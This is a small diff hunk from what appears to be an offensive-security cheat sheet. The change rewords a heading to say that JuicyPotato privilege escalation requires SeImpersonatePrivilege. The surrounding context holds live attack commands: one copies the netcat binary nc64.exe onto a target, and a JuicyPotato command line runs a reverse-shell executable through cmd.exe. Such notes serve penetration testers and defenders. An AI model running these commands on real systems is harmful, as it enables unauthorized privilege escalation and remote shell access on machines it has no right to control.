@@ -144,7 +144,7 @@ Copy-Item –Path \\PA-USER1337\scripts\nc64.exe –Destination 'C:\Users\jumpsr
 &nbsp;
 
 
-**[+] Privilege escalation using juicy potato (Sometimes you need to attach CLSID)**
+**[+] Privilege escalation using juicy potato when you have SeImpersonatePrivilege privilege (Sometimes you need to attach CLSID)**
 
 ```powershell
 JuicyPotato.exe -l 13373 -p c:\windows\system32\cmd.exe -a "/c c:/users/public/reverse.exe" -t *
